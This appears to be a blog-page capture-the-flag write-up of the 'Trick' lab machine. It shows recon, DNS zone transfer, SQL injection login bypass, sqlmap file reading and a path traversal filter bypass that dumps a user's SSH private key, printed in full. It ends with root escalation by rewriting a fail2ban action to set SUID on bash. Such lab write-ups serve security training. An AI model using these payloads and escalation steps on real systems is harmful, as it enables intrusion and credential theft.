@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin SEO tag -->
+<title>Trick | 0bfxgh0st*</title>
+<meta name="generator" content="0bfxgh0st" />
+<meta property="og:title" content="Trick" />
+<meta name="author" content="0bfxgh0st" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Trick WriteUp" />
+<meta property="og:description" content="Trick WriteUp" />
+<link rel="icon" href="/assets/favicon.ico" />
+<link rel="canonical" href="#" />
+<meta property="og:url" content="#" />
+<meta property="og:site_name" content="0bfxgh0st*" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-25T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Trick" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"0bfxgh0st"},"dateModified":"2020-02-25T00:00:00-05:00","datePublished":"2020-02-25T00:00:00-05:00","description":"EvilBox 1 WriteUp","headline":"Welcome To 0bfxgh0st Blog","mainEntityOfPage":{"@type":"WebPage","@id":"#"},"url":"#"}</script>
+<!-- End SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="#" title="0bfxgh0st*" /></head><body><header class="site-header"><a class="site-title" rel="author" href="/">0bfxgh0st*</a><nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <div class="trigger">
+            <a class="page-link" href="/whoami.html">
+              Whoami
+            </a>
+            <a class="page-link" href="/contact.html">
+              Contact
+            </a></div>
+    </nav><div class="site-icon">
+    <img src="/assets/default-icon.png" />
+  </div>
+
+</header>
+<main class="page-content" aria-label="Content">
+        <div class="wrapper">
+            <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Trick</h1>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Port recognition with<code class="language-plaintext highlighter-rouge">nmap</code>or you can use <a href="https://github.com/0bfxgh0st/recon" target="_blank">recon</a></p>
+
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">recon</span> trick.htb
+
+    .o oOOOOOOOo                                            OOOo
+    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
+    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
+    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
+    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
+    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
+    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
+   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
+  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
+ OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
+ "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
+    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
+    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
+    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
+                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
+                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
+    .                  .     OP"          : o     .
+                              :
+                              .
+
+[R3C0N] by 0bfxgh0st 4 WWA with ❤
+
+[OS] Linux (99%)
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-27 19:51 EDT
+NSE: Loaded 1 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 19:51
+Completed NSE at 19:51, 0.00s elapsed
+Initiating Ping Scan at 19:51
+Scanning trick.htb (10.10.11.166) [4 ports]
+Completed Ping Scan at 19:51, 0.15s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 19:51
+Scanning trick.htb (10.10.11.166) [65535 ports]
+Discovered open port 80/tcp on 10.10.11.166
+Discovered open port 25/tcp on 10.10.11.166
+Discovered open port 22/tcp on 10.10.11.166
+Discovered open port 53/tcp on 10.10.11.166
+Completed SYN Stealth Scan at 19:52, 17.18s elapsed (65535 total ports)
+NSE: Script scanning 10.10.11.166.
+Initiating NSE at 19:52
+Completed NSE at 19:52, 0.00s elapsed
+Nmap scan report for trick.htb (10.10.11.166)
+Host is up (0.23s latency).
+Not shown: 64698 closed tcp ports (reset), 833 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+25/tcp open  smtp
+53/tcp open  domain
+80/tcp open  http
+
+NSE: Script Post-scanning.
+Initiating NSE at 19:52
+Completed NSE at 19:52, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds
+           Raw packets sent: 84151 (3.703MB) | Rcvd: 76853 (3.074MB)
+
+
+[i] [WHATWEB]
+http://trick.htb:80 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.10.11.166], Script, Title[Coming Soon - Start Bootstrap Theme], nginx[1.14.2]
+
+[+] [WFUZZ]
+*stage 1 --> (light web path fuzzing wordlist:/usr/share/dirb/wordlists/common.txt)
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://trick.htb:80/FUZZ
+Total requests: 4614
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                           
+=====================================================================
+
+000000001:   200        83 L     475 W      5480 Ch     "http://trick.htb:80/"                                                                                                            
+000000499:   301        7 L      12 W       185 Ch      "assets"                                                                                                                          
+000001114:   301        7 L      12 W       185 Ch      "css"                                                                                                                             
+000002020:   200        83 L     475 W      5480 Ch     "index.html"                                                                                                                      
+000002179:   301        7 L      12 W       185 Ch      "js"                                                                                                                              
+
+Total time: 0
+Processed Requests: 4614
+Filtered Requests: 4609
+Requests/sec.: 0
+
+*stage 2 --> (light permutated extensions fuzzing wordlist:/usr/share/dirb/wordlists/common.txt)
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://trick.htb:80/FUZZ.FUZ2Z
+Total requests: 13842
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                           
+=====================================================================
+
+000006050:   200        83 L     475 W      5480 Ch     "index - html"                                                                                                                    
+
+Total time: 0
+Processed Requests: 13842
+Filtered Requests: 13841
+Requests/sec.: 0
+</code></pre></figure>
+<p>recon reports four open ports and a few information about the host</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">recon </span>trick.htb --axfr trick.htb
+
+    .o oOOOOOOOo                                            OOOo
+    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
+    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
+    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
+    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
+    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
+    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
+   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
+  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
+ OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
+ "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
+    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
+    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
+    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
+                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
+                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
+    .                  .     OP"          : o     .
+                              :
+                              .
+
+[R3C0N] by 0bfxgh0st 4 WWA with ❤
+
+[DiG]
+; <<>> DiG 9.18.1-1-Debian <<>> @trick.htb trick.htb axfr
+; (1 server found)
+;; global options: +cmd
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.              604800  IN      NS      trick.htb.
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+;; Query time: 136 msec
+;; SERVER: 10.10.11.166#53(trick.htb) (TCP)
+;; WHEN: Thu Oct 27 19:53:46 EDT 2022
+;; XFR size: 6 records (messages 1, bytes 231)
+</code></pre></figure>
+
+<p>We perform a domain zone transfer attack over dns port and found preprod-payroll.trick.htb domain, add it to /etc/hosts</p>
+
+<figure class="highlight">
+<img src="/assets/trick1.png" />
+</figure>
+
+<p>This login is vulnerable to sql injection ' or 1=1--</p>
+
+<figure class="highlight">
+<img src="/assets/trick2.png" />
+</figure>
+
+<p>After searching for an LFI we can use a wrapper to leak some sensitive information as http://preprod-payroll.trick.htb/index.php?page=php://filter/convert.base64-encode/resource=db_connect but seems a rabbit hole</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">sqlmap</span> --url "preprod-payroll.trick.htb/ajax.php?action=login" --data "username=test&password=test" --file-read "/var/www/market/index.php" --batch
+        ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.6.10#stable}
+|_ -| . [.]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 07:15:05 /2022-10-28/
+
+[07:15:05] [INFO] resuming back-end DBMS 'mysql' 
+[07:15:05] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=nbe807h97dv...7lnnmst4i5'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=test' AND (SELECT 5338 FROM (SELECT(SLEEP(5)))VpKw) AND 'KGku'='KGku&password=test
+---
+[07:15:05] [INFO] the back-end DBMS is MySQL
+web application technology: PHP, Nginx 1.14.2
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[07:15:05] [INFO] fingerprinting the back-end DBMS operating system
+[07:15:05] [INFO] the back-end DBMS operating system is Linux
+[07:15:05] [INFO] fetching file: '/var/www/market/index.php'
+[07:15:05] [INFO] resumed: 3C3F7068700D0A2466696C65203D20245F4745545B2770616765275D3B0D0A0D0A696628216973736574282466696C6529207C7C20282466696C653D3D22696E6465782E706870222929207B0D0A202020696E636C75646528222F7661722F7777772F6D61726B65742F686F6D652E68746D6C22293B0D0A7D0D0A656C73657B0D0A09696E636C75646528222F7661722F7777772F6D61726B65742F222E7374725F7265706C61636528222E2E2F222C22222C2466696C6529293B0D0A7D0D0A3F3E
+do you want confirmation that the remote file '/var/www/market/index.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
+[07:15:05] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)                                                                    
+[07:15:11] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+1
+[07:15:27] [INFO] adjusting time delay to 2 seconds due to good response times
+94
+[07:15:32] [INFO] the local file '/home/ghost/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php' and the remote file '/var/www/market/index.php' have the same size (194 B)
+files saved to [1]:
+[*] /home/ghost/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php (same file)
+
+[07:15:32] [INFO] fetched data logged to text files under '/home/ghost/.local/share/sqlmap/output/preprod-payroll.trick.htb'
+
+[*] ending @ 07:15:32 /2022-10-28/
+</code></pre></figure>
+
+</p>But sqlmap worked here to read files through</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">cat</span> /home/ghost/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
+&lt?php
+$file = $_GET['page'];
+
+if(!isset($file) || ($file=="index.php")) {
+   include("/var/www/market/home.html");
+}
+else{
+        include("/var/www/market/".str_replace("../","",$file));
+}
+?&gt
+</code></pre></figure>
+
+<p>As we can see here is probably another LFI, check at the str_replace method. When a path traversal strings ../ is found will be 'deleted'
+if we supply ../../../../../ whole string will be erased. You can bypass this with ..././..././..././
+</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">wfuzz</span> -t 100 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hc=400,404,403,301 --hh=5480 -H "Host: preprod-FUZZ.trick.htb" "http://trick.htb"
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://trick.htb/
+Total requests: 114441
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                           
+=====================================================================
+
+000000254:   200        178 L    631 W      9660 Ch     "marketing"                                                                                                                       
+000005309:   302        266 L    527 W      9546 Ch     "payroll"                                                                                                                         
+
+Total time: 0
+Processed Requests: 114441
+Filtered Requests: 114439
+Requests/sec.: 0
+</code></pre></figure>
+
+<p>We move to find more subdomains and found preprod-marketing.trick.htb, add it to /etc/host too</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">lfienum</span> "http://preprod-marketing.trick.htb/index.php?page=..././..././..././" -k
+> michael id_rsa private key
+dumped from http://preprod-marketing.trick.htb/index.php?page=..././..././..././/home/michael/.ssh/id_rsa
+
+[Response Code]: 200
+[Content Lenght]: 1823
+[Content Lines]: 27 
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
+c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
+YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
+4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
+Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
+1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
+DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
++93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
+hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
+jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
+IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
+aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
+KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
+tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
+U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
+fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
+PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
+3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
+fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
+AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
+In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
+JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
+jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
+IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></figure>
+
+<p>After using lfienum we are able to get michael's private id_rsa key</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">chmod</span> 600 key
+</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">ssh</span> michael@trick.htb -i key
+The authenticity of host 'trick.htb (10.10.11.166)' can't be established.
+ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'trick.htb' (ED25519) to the list of known hosts.
+Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+michael@trick:~$ cat user.txt
+b061e833932b738f0cce42d514e1ea7b
+</code></pre></figure>
+
+<p>We are in the system as michael user, time to get root</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">michael@trick:~$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+</code></pre></figure>
+
+<p>We can't edit /etc/fail2ban/action.d/iptables-multiport.conf file but we can write files in that folder</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">michael@trick:~$ sed 's/actionban = .*/actionban = chmod u+s \/bin\/bash/g' /etc/fail2ban/action.d/iptables-multiport.conf > tmp;rm -f /etc/fail2ban/action.d/iptables-multiport.conf;mv tmp /etc/fail2ban/action.d/iptables-multiport.conf
+</code></pre></figure>
+
+<p>We can make a copy of /etc/fail2ban/action.d/iptables-multiport.conf and change the actionban parameter to give SUID permissions to bash, then delete the original /etc/fail2ban/action.d/iptables-multiport.conf and place ours there</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">michael@trick:~$ sudo /etc/init.d/fail2ban restart
+[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
+</code></pre></figure>
+
+<p>Restarting service, now we should to provoke the fail2ban. We can try to log multiple times per second with hydra</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">┌──(root@ghost)-[/home/ghost]
+└─# <span class="s2">hydra</span> trick.htb ssh -l root -P rockyou.txt
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-27 22:39:48
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://trick.htb:22/
+...
+</code></pre></figure>
+
+<p>Let hydra running a few secs and /bin/bash should be SUID</p>
+
+<figure class="highlight"><pre><code class="language-ruby" data-lang="ruby">michael@trick:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+michael@trick:~$ bash -p
+bash-5.0# cat /root/root.txt
+8c63545b6fb57ef8175b7c178db38c5a
+</code></pre></figure>
+
+  </div>
+
+  <p class="post-meta"><time class="dt-published" datetime="2020-02-25T00:00:00-05:00" itemprop="datePublished">
+        Oct 28, 2022
+      </time>• 
+        <span itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <span class="p-author h-card" itemprop="name">0bfxgh0st</span></span></p>
+  
+
+  <a class="u-url" href="#" hidden></a>
+</article>
+
+  </div>
+        </div>
+    </main><footer class="site-footer h-card">
+    <data class="u-url" href="/"></data>
+
+    <div class="wrapper">
+
+        <div class="footer">
+            <div class="footer-title">2022 &copy; 0bfxgh0st*</div>
+
+            <div class="footer-social-links">
+                <a target="_blank" rel="me" href="https://github.com/0bfxgh0st">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub icon</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+                </a>
+                <a target="_blank" rel="me" href="https://twitter.com/0bfxgh0st">
+                    <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter icon</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
+                    </a>
+            </div>
+        </div>
+    </div>
+
+</footer>
+</body>
+
+</html>
